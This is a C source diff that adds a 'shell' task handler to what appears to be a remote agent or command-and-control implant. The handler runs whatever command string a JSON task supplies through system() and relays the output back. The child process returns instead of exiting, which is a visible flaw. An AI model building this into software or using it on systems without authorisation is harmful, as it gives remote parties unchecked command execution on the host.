@@ -1,0 +1,76 @@
+/* takes in the parameter: {"command":"shell","params":"whoami","id":"task number"}
+* executes the command in a shell and returns the output */
+int shell(cJSON* json){
+    /* always in a pipe[], pipe[0] is for read and pipe[1] is for write */
+    int pipes[2][2];
+    char * params = cJSON_GetObjectItem(json, "params")->valuestring;
+    //printf("params: %s\n", params);
+    // pipes for parent to write and read
+    pipe(pipes[PARENT_READ_PIPE]);
+    pipe(pipes[PARENT_WRITE_PIPE]);
+    pid_t pid = fork();
+    if(pid == -1)
+    {
+        send_basic_response("Failed to fork process", cJSON_GetObjectItem(json, "id")->valueint);
+        cJSON_Delete(json);
+        return ERR_FORK_FAILED;
+    }
+    if(pid == 0) {
+        //this is the child process
+        dup2(CHILD_READ_FD, STDIN_FILENO);
+        dup2(CHILD_WRITE_FD, STDOUT_FILENO);
+        dup2(CHILD_WRITE_FD, STDERR_FILENO);
+        /* Close fds not required by child. Also, we don't
+        want the exec'ed program to know these existed */
+        close(CHILD_READ_FD);
+        close(CHILD_WRITE_FD);
+        close(PARENT_READ_FD);
+        close(PARENT_WRITE_FD);
+        //printf("about to execute forked process with system\n");
+        system(params);
+        //printf("just executed it with system\n");
+        return SUCCESS;
+    } else {
+        //this is the parent process
+        int buf_size = 512000;
+        char *buffer = (char*)calloc(buf_size, 1);
+        int err;
+        /* close fds not required by parent */
+        close(CHILD_READ_FD);
+        close(CHILD_WRITE_FD);
+        /* try closing more so we don't mess up FDs when doing multiple tasks*/
+        //close(PARENT_WRITE_FD);
+        // Write to child’s stdin if we wanted to pass data via stdin
+        //write(PARENT_WRITE_FD, "2^32\n", 5);
+        //read from child's stdout
+        //printf("parent process about to read output from child process\n");
+        err = read_from_fd(PARENT_READ_FD, buffer, buf_size);
+        //read(PARENT_READ_FD, buffer, buf_size);
+
+        if(err != SUCCESS){
+            send_basic_response("Failed to read from forked process", cJSON_GetObjectItem(json, "id")->valueint);
+            free(buffer);
+            cJSON_Delete(json);
+            return err;
+        }else{
+            //printf("returned content: %s\n", buffer);
+            send_basic_response(buffer, cJSON_GetObjectItem(json, "id")->valueint);
+            memset((void*)buffer, 0, buf_size);
+            err = read_from_fd(PARENT_READ_FD, buffer, buf_size);
+            //in case we maxed out our buffer, read again until it's not maxed out
+            while(strlen(buffer) > 0){
+                //printf("reading err status: %d\n", err);
+                send_basic_response(buffer, cJSON_GetObjectItem(json, "id")->valueint);
+                memset((void*)buffer, 0, buf_size);
+                err = read_from_fd(PARENT_READ_FD, buffer, buf_size);
+            }
+        }
+        free(buffer);
+        cJSON_Delete(json);
+        return SUCCESS;
+    }
+}
+
+COMMAND_ENDS_HERE
+int shell(cJSON *);
+
